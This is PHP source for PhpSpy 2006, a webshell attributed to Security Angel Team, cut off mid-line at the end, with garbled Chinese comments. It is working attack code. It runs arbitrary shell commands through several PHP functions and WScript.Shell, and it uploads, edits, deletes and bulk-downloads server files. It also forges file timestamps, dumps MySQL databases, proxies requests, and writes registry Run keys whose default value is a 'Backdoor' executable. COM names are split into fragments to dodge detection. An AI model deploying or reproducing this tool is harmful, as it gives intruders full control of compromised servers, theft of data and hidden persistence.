<?php
/*
+--------------------------------------------------------------------------+
| str_replace(".", "", "P.h.p.S.p.y") Version:2006                         |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Mar 21st 2005                                                     |
| Thx All The Fantasy of Wickedness's members                              |
| Thx FireFox (http://www.molyx.com)                                       |
+--------------------------------------------------------------------------+
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== �������� =====================*/

// �Ƿ���Ҫ������֤,1Ϊ��Ҫ��֤,��������Ϊֱ�ӽ���.����ѡ������Ч
$admin['check'] = "1";

// �����Ҫ������֤,���޸ĵ�½����
$admin['pass']  = "wx";

/*===================== ���ý��� =====================*/


// ��������� register_globals = off �Ļ����¹���
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== �����֤ =====================*/
if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">ע���ɹ�......<p><a href=\"".$self."\">������Զ��˳��򵥻������˳�������� gt;gt;gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">��½�ɹ�......<p><a href=\"".$self."\">������Զ���ת�򵥻�������������� gt;gt;gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== ��֤���� =====================*/

// �ж� magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// �鿴PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() �����ѱ�����,��鿴lt;PHP��������gt;";
	exit;
}

// ���ߴ���
if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>��ȡ URL ����ʧ��</b></p></center></body>";
	exit;
}

// �����ļ�
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('��Ҫ�µ��ļ�������!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// ֱ�����ر������ݿ�
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "����: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// ����Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ��ȡ��ǰ·��
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// �ж϶�д���
$dir_writeable = (dir_writeable($nowpath)) ? "��д" : "����д";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">ע������</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2006</title>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#A60000";
}
a:link,a:visited,a:active {
	color: "#000000";
	text-decoration: underline;
}
a:hover {
	color: "#465584";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?action=logout">ע���Ự</a> | <a href="?action=dir">����PhpSpyĿ¼</a> | <a href="?action=phpenv">PHP��������</a> | <a href="?action=proxy">���ߴ���</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a>');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>����·��: '.$pathname.'<br>��ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>��תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ��','','submit').' ��֧�־���·�������·����'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'�ϴ��ļ�����ǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ��','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'�½��ļ��ڵ�ǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ��','','submit')));

$tb->headerform(array('content'=>'�½�Ŀ¼�ڵ�ǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ��','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== ִ�в��� ��ʼ =====================*/
echo "<p><b>\n";
// ɾ���ļ�
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." ɾ���ɹ�!" : "�ļ�ɾ��ʧ��!";
	} else {
		echo basename($delfile)." �ļ��Ѳ�����!";
	}
}

// ɾ��Ŀ¼
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir Ŀ¼�Ѳ�����!";
	} else {
		echo (deltree($deldirs)) ? "Ŀ¼ɾ���ɹ�!" : "Ŀ¼ɾ��ʧ��!";
	}
}

// ����Ŀ¼
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "��Ŀ¼�Ѵ���!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "����Ŀ¼�ɹ�!" : "����ʧ��!";
			@chmod("$mkdirs",0777);
		}
	}
}

// �ϴ��ļ�
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "�ϴ��ɹ�!" : "�ϴ�ʧ��!";
}

// �༭�ļ�
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "д���ļ��ɹ�!" : "д��ʧ��!";
		@fclose($fp);
	} else {
		echo "��������Ҫ�༭���ļ���!";
	}
}

// �༭�ļ�����
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "�����޸ĳɹ�!" : "�޸�ʧ��!";
		echo " �ļ� ".$file." �޸ĺ������Ϊ: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "��������Ҫ���õ�����!";
	}
}

// �ļ�����
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." �Ѿ�����,����������һ��!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." �ɹ�����Ϊ ".$_POST['newname']." !" : "�ļ����޸�ʧ��!";
		}
	} else {
		echo "��������Ҫ�ĵ��ļ���!";
	}
}

// ��¡ʱ��
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "Ҫ���յ��ļ�������!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}

// �Զ���ʱ��
elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}

// ����MYSQL
elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "���ݿ����ӳɹ�!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִ��SQL���
elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL���ɹ�ִ��!" : "����: ".mysql_error();
	mysql_close();
}

// ���ݲ���
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "��ѡ�������ݵ����ݱ�ͱ��ݷ�ʽ!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
			@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : "����: ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "���ݿ��ѳɹ����ݵ� <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "����ʧ��,��ȷ��Ŀ���ļ����Ƿ���п�дȨ��!";
			}
		}
	}
}

// ������� PS:�ļ�̫����ܷǳ���
// Thx : С��
elseif($downrar) {
	if (!empty($dl)) {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);
		$zip=new PHPZip($dl);
		$code=$zip->out;		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
		echo $code;
		exit;
	} else {
		echo "��ѡ��Ҫ������ص��ļ�!";
	}
}

// Shell.Application ���г���
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "�����Ѿ��ɹ�ִ��!" : "��������ʧ��!";
}

// �鿴PHP���ò���״��
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "���ò��� ".$_POST['phpvarname']." �����: ".getphpcfg($_POST['phpvarname'])."";
}

// ��ȡע���
elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}

// д��ע���
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "д��ע���ֵ�ɹ�!" : "д�� ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." ʧ��!";
}

// ɾ��ע���
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "ɾ��ע���ֵ�ɹ�!" : "ɾ�� ".$_POST['delregname']." ʧ��!";
}

else {
	echo "�������� <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> С�� angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] ��������,���� <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> �������°汾.";
}

echo "</b></p>\n";
/*===================== ִ�в��� ���� =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>�ļ�</b></td>
	<td align="center" nowrap width="16%"><b>��������</b></td>
    <td align="center" nowrap width="16%"><b>����޸�</b></td>
    <td align="center" nowrap width="11%"><b>��С</b></td>
    <td align="center" nowrap width="6%"><b>����</b></td>
    <td align="center" nowrap width="24%"><b>����</b></td>
  </tr>
<?php
// Ŀ¼�б�
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap><a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','��ȷ��Ҫɾ�� $file Ŀ¼��? \\n\\n�����Ŀ¼�ǿ�,�˴β�������ɾ����Ŀ¼�µ������ļ�!','1')\">ɾ��</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">�����ϼ�Ŀ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// �ļ��б�
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">����</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">�༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','��ȷ��Ҫɾ�� $file �ļ���?','2')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">����</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ��</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','ѡ���ļ��������','','submit').'</td><td align="right">'.$dir_i.' ��Ŀ¼ / '.$file_i.' ���ļ�</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'�½�/�༭�ļ�');
	$tb->tdbody('��ǰ�ļ�: '.$tb->makeinput('editfilename',$filename).' �������ļ����������ļ�');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ���');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('��ǰ�ļ���: '.basename($nowfile));
	$tb->tdbody('����Ϊ: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ�����');
	$tb->tdbody('�޸� '.$file.' ������Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'��¡�ļ�����޸�ʱ��');
	$tb->tdbody("�޸��ļ�: ".$tb->makeinput('curfile',$file,'readonly')." �� Ŀ���ļ�: ".$tb->makeinput('tarfile','��������·�����ļ���'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'�Զ����ļ�����޸�ʱ��');
	$tb->tdbody('<br><ul><li>��Ч��ʱ������ͷ�Χ�ǴӸ�������ʱ�� 1901 �� 12 �� 13 �� ������ 20:45:54 �� 2038�� 1 �� 19 �� ���ڶ� 03:14:07<br>(�����ڸ��� 32 λ�з�����������Сֵ�����ֵ����)</li><li>˵��: ��ȡ 01 �� 30 ֮��, ʱȡ 0 �� 24 ֮��, �ֺ���ȡ 0 �� 60 ֮��!</li></ul>','left');
	$tb->tdbody('��ǰ�ļ���: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('�޸�Ϊ: '.$tb->makeinput('year','1984','','text','4').' �� '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' �� '.$tb->makeinput('data','18','','text','2').' �� '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').' �� '.$tb->makeinput('second','00','','text','2').' ��','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');

	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('�޻������г��� �� �ļ�: '.$tb->makeinput('program',$program).' ����: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}

	echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
	$tb->tdbody('��ʾ:�������������ȫ,�����������д���ļ�.�������Եõ�ȫ������.');
	
	$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');

	$tb->tdbody('ѡ��ִ�к���: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' ��������: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'��ȡע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','��ȡ','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'д��ע���');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('��ֵ: '.$tb->makeinput('writeregname',$registre,'','text','56').' ����: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' ֵ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','д��','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'ɾ��ע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','ɾ��','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg

elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'���ߴ���','proxyframe');
	$tb->tdbody('<br><ul><li>�ñ����ܽ�ʵ�ּ򵥵� HTTP ����,������ʾʹ�����·����ͼƬ�����Ӽ�CSS��ʽ��.</li><li>�ñ����ܿ���ͨ�������������Ŀ��URL,����֧�� SQL Injection ̽���Լ�ĳЩ�����ַ�.</li><li>�ñ���������� URL,��Ŀ�����������µ�IP��¼�� : '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','���','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.4ngel.net"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
	$tb->tableheader();
	$tb->formheader($action,'ִ�� SQL ���');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','����','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_que